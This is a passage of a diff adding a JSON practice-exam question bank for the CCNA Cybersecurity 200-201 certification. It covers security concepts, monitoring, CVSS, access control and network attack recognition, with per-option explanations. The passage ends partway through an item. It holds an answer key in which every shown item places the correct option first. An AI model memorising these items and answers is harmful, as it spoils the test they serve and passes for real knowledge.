@@ -1,0 +1,4381 @@
+{
+ "app": "MyNextCert",
+ "kind": "qbank",
+ "v": 1,
+ "cert": "CCNA Cybersecurity",
+ "ver": "v12",
+ "exam": "200-201",
+ "title": "CCNA Cybersecurity 200-201 (v1.2) practice exam",
+ "rev": "2026-11-21",
+ "format": {
+  "n": 100,
+  "min": 120,
+  "pbq": 4,
+  "half": 50
+ },
+ "domains": [
+  {
+   "n": "1.0",
+   "name": "Security Concepts",
+   "w": 20,
+   "obj": 11
+  },
+  {
+   "n": "2.0",
+   "name": "Security Monitoring",
+   "w": 25,
+   "obj": 11
+  },
+  {
+   "n": "3.0",
+   "name": "Host-Based Analysis",
+   "w": 20,
+   "obj": 7
+  },
+  {
+   "n": "4.0",
+   "name": "Network Intrusion Analysis",
+   "w": 20,
+   "obj": 10
+  },
+  {
+   "n": "5.0",
+   "name": "Security Policies and Procedures",
+   "w": 15,
+   "obj": 11
+  }
+ ],
+ "note": "Original questions written for MyNextCert from Cisco's public 200-201 CCNACBR v1.2 exam topics (July 2025). Not real exam questions. Cisco doesn't publish the number of items on the real exam; this is a 100-item stand-in in 120 minutes with 4 drag-and-drop style items.",
+ "q": [
+  {
+   "id": "cb-1-01",
+   "d": "1.0",
+   "obj": "1.1",
+   "q": "Ransomware encrypts a hospital's file server. Logs show no data left the network. Staff can't open any patient files. Which part of the CIA triad was hit MOST directly?",
+   "o": [
+    [
+     "Availability",
+     "Right. The data still exists and wasn't read by outsiders, but nobody can use it."
+    ],
+    [
+     "Confidentiality",
+     "Nothing was read or taken, so secrecy held."
+    ],
+    [
+     "Integrity",
+     "The files were changed, but the main harm here is that no one can reach them."
+    ],
+    [
+     "Non-repudiation",
+     "Non-repudiation is about proving who did something. It isn't part of the CIA triad."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-02",
+   "d": "1.0",
+   "obj": "1.1",
+   "q": "A file integrity tool reports that the SHA-256 hash of a router's saved config changed overnight. No change ticket exists. Which property is the tool protecting?",
+   "o": [
+    [
+     "Integrity",
+     "Right. A changed hash means the data was altered, and no approved change explains it."
+    ],
+    [
+     "Availability",
+     "The config is still there and readable."
+    ],
+    [
+     "Confidentiality",
+     "A hash check shows change, not who read the file."
+    ],
+    [
+     "Authentication",
+     "Authentication proves identity. The tool is checking the data itself."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-03",
+   "d": "1.0",
+   "obj": "1.1",
+   "q": "A laptop with an unencrypted disk is stolen from a car. It held a spreadsheet of employee home addresses. Which CIA principle is at risk?",
+   "o": [
+    [
+     "Confidentiality",
+     "Right. Anyone with the laptop can read the data."
+    ],
+    [
+     "Integrity",
+     "Nobody has changed the original records."
+    ],
+    [
+     "Availability",
+     "The company still has the records on its servers."
+    ],
+    [
+     "Accountability",
+     "Accountability tracks actions to people. The risk here is exposure."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-04",
+   "d": "1.0",
+   "obj": "1.2",
+   "q": "A tool gets an alert from the SIEM, looks up the source IP's reputation, blocks it on the firewall and opens a ticket, all without a person. What is this tool?",
+   "o": [
+    [
+     "SOAR",
+     "Right. Security orchestration, automation and response runs playbooks across tools."
+    ],
+    [
+     "Log management",
+     "Log management collects and stores logs. It doesn't act."
+    ],
+    [
+     "A legacy antivirus",
+     "Antivirus scans files on one host."
+    ],
+    [
+     "NetFlow collector",
+     "NetFlow records traffic. It doesn't block or open tickets."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-05",
+   "d": "1.0",
+   "obj": "1.2",
+   "q": "Which is an example of an AGENTLESS protection?",
+   "o": [
+    [
+     "A network IPS with nothing installed on hosts",
+     "Right. Agentless tools work from outside the endpoint, often on the network."
+    ],
+    [
+     "An EDR sensor installed on every laptop",
+     "Installed software on each host is agent-based."
+    ],
+    [
+     "A host firewall managed by a central console",
+     "A host firewall runs on the endpoint itself."
+    ],
+    [
+     "Antimalware with a local signature database on each PC",
+     "Local antimalware is agent software on the host."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-06",
+   "d": "1.0",
+   "obj": "1.2",
+   "q": "A fileless attack runs PowerShell straight in memory and never writes an executable to disk. Why is LEGACY antivirus likely to miss it?",
+   "o": [
+    [
+     "It mostly matches known file signatures on disk",
+     "Right. Classic antivirus scans files for known patterns. Code that lives only in memory gives it little to match."
+    ],
+    [
+     "It only scans while no user is logged on to the computer",
+     "Antivirus runs all the time, not only when users log off."
+    ],
+    [
+     "It can't scan files larger than 10 MB",
+     "File size isn't why it misses memory-only code."
+    ],
+    [
+     "It needs a SIEM before it can raise alerts",
+     "Antivirus raises its own alerts without a SIEM."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-07",
+   "d": "1.0",
+   "obj": "1.2",
+   "q": "Ten containers run on one Linux host. Compared with ten virtual machines, what is the main extra risk?",
+   "o": [
+    [
+     "They share one kernel, so a kernel flaw hits all",
+     "Right. Containers isolate processes but use one kernel. VMs each have their own kernel behind a hypervisor."
+    ],
+    [
+     "They can't use encryption for network traffic",
+     "Containers can use TLS like any other workload."
+    ],
+    [
+     "Each container needs its own separate hypervisor to run",
+     "Containers don't use a hypervisor per container."
+    ],
+    [
+     "Their logs can't be sent to a SIEM",
+     "Container logs can be shipped to a SIEM."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-08",
+   "d": "1.0",
+   "obj": "1.2",
+   "q": "Your team rents IaaS virtual machines in a public cloud. Under the shared responsibility model, who patches the guest operating system?",
+   "o": [
+    [
+     "Your team, the customer",
+     "Right. In IaaS the provider secures the physical hosts and hypervisor. The customer owns the guest OS and up."
+    ],
+    [
+     "The cloud provider",
+     "The provider stops at the hypervisor in IaaS."
+    ],
+    [
+     "Nobody, cloud VMs patch themselves",
+     "Cloud VMs don't patch themselves unless you set that up."
+    ],
+    [
+     "The OS vendor, directly",
+     "The vendor releases patches. Someone still has to apply them."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-09",
+   "d": "1.0",
+   "obj": "1.3",
+   "q": "An analyst starts with the idea that attackers may be using scheduled tasks for persistence. She searches every host for unusual tasks, even though no alert fired. What is she doing?",
+   "o": [
+    [
+     "Threat hunting",
+     "Right. Hunting is a proactive, hypothesis-driven search for threats that slipped past detection."
+    ],
+    [
+     "Reverse engineering",
+     "Reverse engineering takes apart a program to learn how it works."
+    ],
+    [
+     "Run book automation",
+     "Run book automation runs set steps automatically."
+    ],
+    [
+     "Threat modeling",
+     "Threat modeling maps how a system could be attacked, usually during design."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-10",
+   "d": "1.0",
+   "obj": "1.3",
+   "q": "A detector compares the last 15 minutes of login failures with a baseline, then moves forward one minute and compares again. What technique is this?",
+   "o": [
+    [
+     "Sliding window anomaly detection",
+     "Right. A moving time window is compared with normal behavior to spot spikes."
+    ],
+    [
+     "Signature matching",
+     "Signatures look for known patterns, not changes against a baseline."
+    ],
+    [
+     "Sandbox detonation",
+     "A sandbox runs a file to watch what it does."
+    ],
+    [
+     "Threat intelligence",
+     "Threat intel is knowledge about threats, not a counting method."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-11",
+   "d": "1.0",
+   "obj": "1.3",
+   "q": "Every code commit now triggers a dependency scan and a static code scan before it can be merged. Which practice does this show?",
+   "o": [
+    [
+     "DevSecOps",
+     "Right. Security checks are built into the development pipeline."
+    ],
+    [
+     "Malware analysis",
+     "Nothing here studies malicious code."
+    ],
+    [
+     "Threat hunting",
+     "Hunting searches live systems for attackers."
+    ],
+    [
+     "Reverse engineering",
+     "The team is checking its own code, not taking apart someone else's."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-12",
+   "d": "1.0",
+   "obj": "1.4",
+   "q": "A web server runs an unpatched Apache Struts version. A script on GitHub sends a crafted request that runs commands on it. What is the script?",
+   "o": [
+    [
+     "An exploit",
+     "Right. An exploit is the code or method that takes advantage of a weakness."
+    ],
+    [
+     "A vulnerability",
+     "The unpatched flaw is the vulnerability. The script uses it."
+    ],
+    [
+     "A threat",
+     "A threat is the actor or event that could cause harm."
+    ],
+    [
+     "A risk",
+     "Risk is the chance and impact of harm, not the tool."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-13",
+   "d": "1.0",
+   "obj": "1.4",
+   "q": "Two servers have the same critical flaw. One is internal and holds test data. The other faces the internet and stores patient records. Why is the second server's risk higher?",
+   "o": [
+    [
+     "Both the likelihood and the impact are higher",
+     "Right. Risk weighs how likely an attack is and how bad the result would be."
+    ],
+    [
+     "The vulnerability is more severe on that server",
+     "It's the same flaw on both."
+    ],
+    [
+     "Internal servers can't be attacked",
+     "Internal servers can be reached by insiders or after a breach."
+    ],
+    [
+     "Only the exploit code differs",
+     "The same exploit works on both."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-14",
+   "d": "1.0",
+   "obj": "1.4",
+   "q": "Which of these is a THREAT, not a vulnerability?",
+   "o": [
+    [
+     "A ransomware group that targets hospitals",
+     "Right. A threat is an actor or event that could exploit a weakness."
+    ],
+    [
+     "A default admin password on a camera",
+     "A default password is a weakness, so it's a vulnerability."
+    ],
+    [
+     "A missing security patch on an internet-facing server",
+     "A missing patch is a vulnerability."
+    ],
+    [
+     "An open SMB port on a public server",
+     "An exposed service is a weakness or part of the attack surface."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-15",
+   "d": "1.0",
+   "obj": "1.5",
+   "q": "A phishing email gets past the email filter. The user opens the attachment, but the endpoint agent blocks the payload. Which principle worked here?",
+   "o": [
+    [
+     "Defense in depth",
+     "Right. When one layer failed, another layer stopped the attack."
+    ],
+    [
+     "Least privilege",
+     "Least privilege limits rights. Nothing here was about rights."
+    ],
+    [
+     "Separation of duties",
+     "Separation of duties splits tasks between people."
+    ],
+    [
+     "Security through obscurity",
+     "Hiding details wasn't what stopped the attack."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-16",
+   "d": "1.0",
+   "obj": "1.5",
+   "q": "Which setup BEST shows defense in depth?",
+   "o": [
+    [
+     "Email filtering, EDR and segmentation",
+     "Right. Several different layers mean one failure isn't a breach."
+    ],
+    [
+     "One next-gen firewall with every feature turned on",
+     "One device is still a single point of failure, however many features it has."
+    ],
+    [
+     "Two identical firewalls from the same vendor, one after the other",
+     "Two copies of the same control often fail the same way."
+    ],
+    [
+     "Strong passwords required for every account",
+     "Strong passwords are one control, not layers."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-17",
+   "d": "1.0",
+   "obj": "1.5",
+   "q": "A manager asks why the company still needs internal segmentation if the perimeter firewall is strong. What is the BEST answer?",
+   "o": [
+    [
+     "No one control stops everything, so layers limit harm",
+     "Right. Defense in depth assumes a layer will fail and plans for it."
+    ],
+    [
+     "Segmentation makes the perimeter firewall faster",
+     "Segmentation doesn't speed up the perimeter firewall."
+    ],
+    [
+     "Firewalls can't inspect any traffic",
+     "Firewalls do inspect traffic. The issue is that no layer is perfect."
+    ],
+    [
+     "Auditors require it, but it adds no real security once the perimeter is strong",
+     "Segmentation slows lateral movement, so it adds real security."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-18",
+   "d": "1.0",
+   "obj": "1.6",
+   "q": "Contractors can sign in only from 0700 to 1800 on weekdays. Logins outside that window are denied. Which access control model is this?",
+   "o": [
+    [
+     "Time-based",
+     "Right. Access depends on the time of day or day of week."
+    ],
+    [
+     "Discretionary",
+     "Discretionary access lets the owner decide who gets in."
+    ],
+    [
+     "Mandatory",
+     "Mandatory access uses labels and clearances."
+    ],
+    [
+     "Role-based",
+     "Role decides the rights, but here the clock decides when."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-19",
+   "d": "1.0",
+   "obj": "1.6",
+   "q": "An auditor asks which commands an admin ran on a core switch last Tuesday. Which part of AAA provides this?",
+   "o": [
+    [
+     "Accounting",
+     "Right. Accounting records what a user did and when."
+    ],
+    [
+     "Authentication",
+     "Authentication proves who the admin is."
+    ],
+    [
+     "Authorization",
+     "Authorization decides which commands are allowed."
+    ],
+    [
+     "Auditing",
+     "Auditing reviews records, but AAA's third A that creates the records is accounting."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-20",
+   "d": "1.0",
+   "obj": "1.6",
+   "q": "Access to payroll needs three things: Finance department, a company-managed device and a U.S. location. Which model fits BEST?",
+   "o": [
+    [
+     "Attribute-based",
+     "Right. Several attributes of the user, device and place decide access."
+    ],
+    [
+     "Role-based",
+     "Role is only one of the three factors here."
+    ],
+    [
+     "Discretionary",
+     "No owner is choosing who gets in."
+    ],
+    [
+     "Rule-based",
+     "Rule-based applies one rule to everyone, not a mix of user attributes."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-21",
+   "d": "1.0",
+   "obj": "1.7",
+   "q": "A flaw can be exploited only by someone on the same local network segment, for example the same Wi-Fi. Which CVSS Attack Vector value fits?",
+   "o": [
+    [
+     "Adjacent",
+     "Right. Adjacent means the attacker must share a local network with the target."
+    ],
+    [
+     "Network",
+     "Network means reachable across routers, even from the internet."
+    ],
+    [
+     "Local",
+     "Local needs access to the system itself, like a shell."
+    ],
+    [
+     "Physical",
+     "Physical means touching the device."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-22",
+   "d": "1.0",
+   "obj": "1.7",
+   "q": "An exploit lets code in a guest VM take over the hypervisor and every other VM on that host. Which CVSS metric reflects this?",
+   "o": [
+    [
+     "Scope: Changed",
+     "Right. The impact reaches past the vulnerable part into other components."
+    ],
+    [
+     "Attack Complexity: High",
+     "Complexity is about how hard the attack is, not how far it spreads."
+    ],
+    [
+     "User Interaction: Required",
+     "Nobody had to click anything."
+    ],
+    [
+     "Privileges Required: None",
+     "That measures needed rights, not how far the damage spreads."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-23",
+   "d": "1.0",
+   "obj": "1.7",
+   "q": "A flaw's base score is 7.5. A week later a working exploit shows up in a public exploit kit. Which CVSS metric group changes?",
+   "o": [
+    [
+     "Temporal",
+     "Right. Temporal metrics track things that change over time, like exploit maturity and fixes."
+    ],
+    [
+     "Base",
+     "Base metrics describe the flaw itself and don't change over time."
+    ],
+    [
+     "Environmental",
+     "Environmental metrics reflect your own systems and needs."
+    ],
+    [
+     "Impact subscore",
+     "The impact on CIA hasn't changed."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-24",
+   "d": "1.0",
+   "obj": "1.8",
+   "q": "Two VMs on the same host talk to each other. The traffic never leaves the virtual switch. Why can't the data center's physical IDS see it?",
+   "o": [
+    [
+     "The traffic never crosses the physical sensor",
+     "Right. East-west traffic inside one host stays on the virtual switch."
+    ],
+    [
+     "VMs always encrypt traffic between them",
+     "VMs don't encrypt by default."
+    ],
+    [
+     "The IDS ignores private IP addresses",
+     "IDSs inspect private addresses all the time."
+    ],
+    [
+     "Virtual switches throw away all of their traffic logs",
+     "Logs aren't the issue. The packets never reach the sensor."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-25",
+   "d": "1.0",
+   "obj": "1.8",
+   "q": "Remote staff use a split-tunnel VPN. Traffic to SaaS apps goes straight to the internet from home. What visibility problem does this create?",
+   "o": [
+    [
+     "Corporate sensors never see the SaaS traffic",
+     "Right. Only some traffic crosses the VPN, so the rest skips company monitoring."
+    ],
+    [
+     "The VPN can't encrypt corporate traffic",
+     "Split tunneling still encrypts what goes over the VPN."
+    ],
+    [
+     "Users can no longer reach any internal servers at all",
+     "Internal traffic still goes through the tunnel."
+    ],
+    [
+     "SaaS apps stop logging users in",
+     "SaaS sign-in isn't affected."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-26",
+   "d": "1.0",
+   "obj": "1.8",
+   "q": "The company moves to TLS 1.3 on every internal web app. The network IDS raises far fewer web attack alerts. What is the MOST likely reason?",
+   "o": [
+    [
+     "The IDS can't read encrypted payloads",
+     "Right. Encryption hides content from tools that don't decrypt it."
+    ],
+    [
+     "TLS 1.3 blocks all web attacks",
+     "TLS protects data in transit. It doesn't stop SQL injection inside the tunnel."
+    ],
+    [
+     "The attackers have stopped",
+     "Fewer alerts after a visibility change usually means less seen, not less happening."
+    ],
+    [
+     "TLS 1.3 turns off request logging on every web server",
+     "Web servers still log requests."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-27",
+   "d": "1.0",
+   "obj": "1.9",
+   "q": "A workstation that normally uploads a few MB a day sends 6 GB to an unfamiliar cloud storage IP at 02:30. What should an analyst suspect FIRST?",
+   "o": [
+    [
+     "Data exfiltration",
+     "Right. A big jump in outbound data at an odd time to a new place is a classic loss sign."
+    ],
+    [
+     "A failed Windows update",
+     "Updates download data. They don't upload gigabytes."
+    ],
+    [
+     "A DHCP lease renewal",
+     "DHCP uses tiny packets."
+    ],
+    [
+     "Normal web browsing",
+     "Browsing mostly downloads, and this host rarely uploads."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-28",
+   "d": "1.0",
+   "obj": "1.9",
+   "q": "One host makes thousands of DNS queries an hour for long random names under one domain, like 4f9a2c...e1.example-cdn.net. What is the MOST likely cause?",
+   "o": [
+    [
+     "DNS tunneling",
+     "Right. Long, random, unique subdomains are a common way to sneak data out over DNS."
+    ],
+    [
+     "A misconfigured DHCP scope on the local subnet",
+     "DHCP problems don't create random DNS names."
+    ],
+    [
+     "A browser loading many images",
+     "Images come from a few names, not thousands of random ones."
+    ],
+    [
+     "Normal time synchronization",
+     "NTP doesn't make DNS queries like these."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-29",
+   "d": "1.0",
+   "obj": "1.9",
+   "q": "Which traffic profile change MOST suggests data loss from a file server?",
+   "o": [
+    [
+     "It now sends far more out than in, to an outside host",
+     "Right. A server suddenly sending far more out than it takes in, to an outside place, is a warning sign."
+    ],
+    [
+     "It answers many more SMB requests from internal users each morning",
+     "More internal use is normal for a file server."
+    ],
+    [
+     "Its backup job finishes ten minutes later",
+     "A slower backup isn't a loss sign by itself."
+    ],
+    [
+     "It gets more ARP requests from the gateway",
+     "ARP traffic is local and tiny."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-30",
+   "d": "1.0",
+   "obj": "1.10",
+   "q": "Which set makes up the 5-tuple used to group logs about one connection?",
+   "o": [
+    [
+     "Source IP, destination IP, source port, destination port, protocol",
+     "Right. These five values identify a single flow."
+    ],
+    [
+     "Source MAC, destination MAC, VLAN ID, destination port, protocol",
+     "MAC addresses and VLAN aren't part of the 5-tuple."
+    ],
+    [
+     "Source IP, user name, host name, timestamp, protocol",
+     "User and host names come from other logs."
+    ],
+    [
+     "Destination IP, URL, user agent, port, bytes",
+     "These are web log fields, not the 5-tuple."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-31",
+   "d": "1.0",
+   "obj": "1.10",
+   "q": "A firewall log shows 203.0.113.10:44123 > 198.51.100.7:443 TCP. 203.0.113.10 is the PAT address shared by 400 internal hosts. How do you find the infected host?",
+   "o": [
+    [
+     "Match the translated port and time in the NAT log",
+     "Right. With PAT, the translated port plus the time ties back to one inside IP and port."
+    ],
+    [
+     "Block 203.0.113.10 at the firewall",
+     "That would cut off all 400 hosts and still not find the one."
+    ],
+    [
+     "Search DHCP logs for 203.0.113.10",
+     "DHCP hands out inside addresses, not the shared public one."
+    ],
+    [
+     "Run a ping sweep of the whole inside network to find live hosts",
+     "Pinging doesn't show which host made the connection."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-32",
+   "d": "1.0",
+   "obj": "1.10",
+   "q": "An IDS alert, a proxy log and a NetFlow record all mention the same connection. Which step lets you join them to one inside host?",
+   "o": [
+    [
+     "Match the 5-tuple and time in all three",
+     "Right. The same five values at the same time tie events from different tools to one flow."
+    ],
+    [
+     "Search the proxy log for the IDS alert's signature ID",
+     "The proxy doesn't know the IDS signature."
+    ],
+    [
+     "Sort all three logs by user name",
+     "NetFlow has no user names."
+    ],
+    [
+     "Compare each source's severity rating",
+     "Severity doesn't identify the connection."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-33",
+   "d": "1.0",
+   "obj": "1.11",
+   "q": "A brand-new malware family uses a protocol nobody has seen. Which detection approach is MORE likely to catch it on day one?",
+   "o": [
+    [
+     "Behavioral, against a baseline",
+     "Right. Behavior and statistics can flag something unusual even without a known pattern."
+    ],
+    [
+     "Signature-based",
+     "No signature exists yet for something nobody has seen."
+    ],
+    [
+     "Hash blocklist",
+     "The hash isn't on any list yet."
+    ],
+    [
+     "Rule-based IDS with current rules",
+     "Rules are written for known traffic."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-34",
+   "d": "1.0",
+   "obj": "1.11",
+   "q": "What is the main DOWNSIDE of statistical and behavioral detection compared with rules?",
+   "o": [
+    [
+     "More false positives until the baseline is tuned",
+     "Right. Normal but unusual activity can look like an attack until the baseline is learned."
+    ],
+    [
+     "It can never detect new attacks",
+     "Detecting new attacks is its strength."
+    ],
+    [
+     "It needs a new signature written for each new attack it sees",
+     "That describes rule-based detection."
+    ],
+    [
+     "It can't run on network traffic",
+     "Behavioral analytics run on network data all the time."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-1-35",
+   "d": "1.0",
+   "obj": "1.11",
+   "q": "A Snort rule alerts when a packet to TCP 445 contains a specific byte string. What kind of detection is this?",
+   "o": [
+    [
+     "Rule-based, using a signature",
+     "Right. It matches a known, defined pattern."
+    ],
+    [
+     "Statistical anomaly detection",
+     "No baseline or statistics are used."
+    ],
+    [
+     "Behavioral analytics",
+     "It doesn't learn what's normal."
+    ],
+    [
+     "Predictive AI",
+     "A fixed byte match isn't a learning model."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-01",
+   "d": "2.0",
+   "obj": "2.1",
+   "q": "The team closes unused ports, removes an old FTP service and retires two public test sites. What did they reduce?",
+   "o": [
+    [
+     "The attack surface",
+     "Right. Fewer reachable services and entry points means less for an attacker to try."
+    ],
+    [
+     "The number of CVEs in the remaining software",
+     "The software left behind still has the same flaws."
+    ],
+    [
+     "The CVSS base scores",
+     "Base scores describe each flaw and don't change."
+    ],
+    [
+     "The threat actors' skills",
+     "Nothing here affects the attackers."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-02",
+   "d": "2.0",
+   "obj": "2.1",
+   "q": "Which of these is a VULNERABILITY rather than just part of the attack surface?",
+   "o": [
+    [
+     "An unpatched buffer overflow in the VPN service",
+     "Right. A specific, exploitable weakness is a vulnerability."
+    ],
+    [
+     "The VPN service listening on UDP 443",
+     "A listening service is an entry point. It's attack surface."
+    ],
+    [
+     "Employees who can receive email from outside the company",
+     "People who get email are part of the attack surface."
+    ],
+    [
+     "A public API that partners call",
+     "An exposed API is attack surface until a weakness is found."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-03",
+   "d": "2.0",
+   "obj": "2.1",
+   "q": "A company launches a new public mobile API. A scan finds no known vulnerabilities. Which statement is TRUE?",
+   "o": [
+    [
+     "The attack surface grew anyway",
+     "Right. Every new reachable service adds surface, flawed or not."
+    ],
+    [
+     "Risk stays the same because there are no CVEs",
+     "Unknown flaws and misuse still add risk."
+    ],
+    [
+     "Attack surface only counts internal systems",
+     "Public-facing services are a big part of the attack surface."
+    ],
+    [
+     "A clean scan means the API can't be attacked by anyone",
+     "Scanners only find what they know to look for."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-04",
+   "d": "2.0",
+   "obj": "2.2",
+   "q": "An analyst needs the exact body of an HTTP POST sent by a suspect host. Which source can provide it?",
+   "o": [
+    [
+     "A full packet capture made with tcpdump",
+     "Right. A capture keeps the whole packet, payload included, if it isn't encrypted."
+    ],
+    [
+     "NetFlow records",
+     "NetFlow keeps addresses, ports, times and byte counts, not payloads."
+    ],
+    [
+     "Stateful firewall connection logs for that host",
+     "These log the connection, not the content."
+    ],
+    [
+     "DHCP server logs",
+     "DHCP logs show address leases only."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-05",
+   "d": "2.0",
+   "obj": "2.2",
+   "q": "A firewall blocks BitTorrent even though it runs over TCP 443, and it logs the user's AD name. What kind of firewall is it?",
+   "o": [
+    [
+     "Next-generation firewall",
+     "Right. NGFWs identify applications and users, not just ports."
+    ],
+    [
+     "Traditional stateful firewall",
+     "A stateful firewall tracks sessions by IP and port. It can't tell BitTorrent from HTTPS on 443."
+    ],
+    [
+     "Stateless packet filter",
+     "A packet filter only checks header fields like ports."
+    ],
+    [
+     "NetFlow exporter",
+     "NetFlow records traffic. It doesn't block it."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-06",
+   "d": "2.0",
+   "obj": "2.2",
+   "q": "A log line reads: user=jdoe url=hxxp://bet-now[.]example category=Gambling action=block. Which technology wrote it?",
+   "o": [
+    [
+     "Web content filtering",
+     "Right. URL categories and block actions come from web filtering."
+    ],
+    [
+     "Email content filtering",
+     "Email filters log senders, recipients and attachments."
+    ],
+    [
+     "NetFlow",
+     "NetFlow has no URLs or categories."
+    ],
+    [
+     "Host-based firewall",
+     "A host firewall logs ports and programs, not URL categories."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-07",
+   "d": "2.0",
+   "obj": "2.3",
+   "q": "Web server logs show every request coming from 10.1.1.5, the load balancer. How can analysts see the real client IPs?",
+   "o": [
+    [
+     "Log the X-Forwarded-For header",
+     "Right. The load balancer can pass the original client IP in a header."
+    ],
+    [
+     "Turn off TLS on the load balancer",
+     "Encryption isn't what hides the client IP."
+    ],
+    [
+     "Check the DHCP server for 10.1.1.5",
+     "That only tells you the load balancer's own address."
+    ],
+    [
+     "Ask the company's ISP for a copy of its NAT tables",
+     "Clients come from all over the internet, not one ISP."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-08",
+   "d": "2.0",
+   "obj": "2.3",
+   "q": "An analyst sees a workstation connect to a known Tor entry node. What can network monitoring tell about the final destination?",
+   "o": [
+    [
+     "Almost nothing",
+     "Right. Traffic is wrapped in layers and passed through several relays, so only the entry node is visible."
+    ],
+    [
+     "The full URL, from the TLS SNI field",
+     "The SNI belongs to the Tor link, not the final site."
+    ],
+    [
+     "The final destination, from the company's DNS logs",
+     "Tor clients resolve names inside the Tor network."
+    ],
+    [
+     "The destination, from the IP header",
+     "The IP header points at the entry node."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-09",
+   "d": "2.0",
+   "obj": "2.3",
+   "q": "An outside IDS sits on the internet side of the edge router, which does PAT. An alert names 198.51.100.20 as the source of attacks. What problem does this cause?",
+   "o": [
+    [
+     "All inside hosts share that IP, so the host is hidden",
+     "Right. PAT hides inside addresses behind one public IP."
+    ],
+    [
+     "The IDS can't read TCP headers after NAT",
+     "NAT changes addresses and ports, but headers are still readable."
+    ],
+    [
+     "PAT encrypts the traffic",
+     "PAT doesn't encrypt anything."
+    ],
+    [
+     "The IDS sees duplicate copies of each packet after translation",
+     "PAT doesn't duplicate packets."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-10",
+   "d": "2.0",
+   "obj": "2.4",
+   "q": "A record says host A talked to host B on TCP 22 for 47 minutes and sent 3 MB. There are no payloads. Which data type is this?",
+   "o": [
+    [
+     "Session data",
+     "Right. Session data summarizes a whole conversation: who, how long and how much."
+    ],
+    [
+     "Full packet capture",
+     "A full capture would include payloads."
+    ],
+    [
+     "Alert data",
+     "Nothing here was flagged by a rule."
+    ],
+    [
+     "Statistical data",
+     "Statistical data is aggregated across many sessions."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-11",
+   "d": "2.0",
+   "obj": "2.4",
+   "q": "A proxy log shows each HTTP request with the matching response code and size: GET /login 200 4 KB. Which data type is this?",
+   "o": [
+    [
+     "Transaction data",
+     "Right. Transaction data pairs each request with its response."
+    ],
+    [
+     "Session data",
+     "Session data covers the whole connection, not each request in it."
+    ],
+    [
+     "Metadata only",
+     "This is more than data about data. It records each exchange."
+    ],
+    [
+     "Full packet capture",
+     "No packets or payloads were kept."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-12",
+   "d": "2.0",
+   "obj": "2.4",
+   "q": "A dashboard shows that average outbound traffic from the HR subnet is 40 Mbps at 10:00 on weekdays. Which data type is this?",
+   "o": [
+    [
+     "Statistical data",
+     "Right. Averages and baselines across time are statistical data."
+    ],
+    [
+     "Alert data",
+     "No rule fired."
+    ],
+    [
+     "Transaction data",
+     "It doesn't show single requests and responses."
+    ],
+    [
+     "Full packet capture",
+     "No packets are stored here."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-13",
+   "d": "2.0",
+   "obj": "2.5",
+   "q": "A server's connection table fills with half-open connections. Captures show thousands of SYNs from many spoofed IPs and no final ACKs. What attack is this?",
+   "o": [
+    [
+     "SYN flood",
+     "Right. The attacker starts handshakes and never finishes them, using up the server's resources."
+    ],
+    [
+     "ARP spoofing",
+     "ARP spoofing poisons local address tables."
+    ],
+    [
+     "DNS tunneling",
+     "DNS tunneling hides data in DNS traffic."
+    ],
+    [
+     "Smurf attack",
+     "Smurf uses ICMP broadcasts, not TCP SYNs."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-14",
+   "d": "2.0",
+   "obj": "2.5",
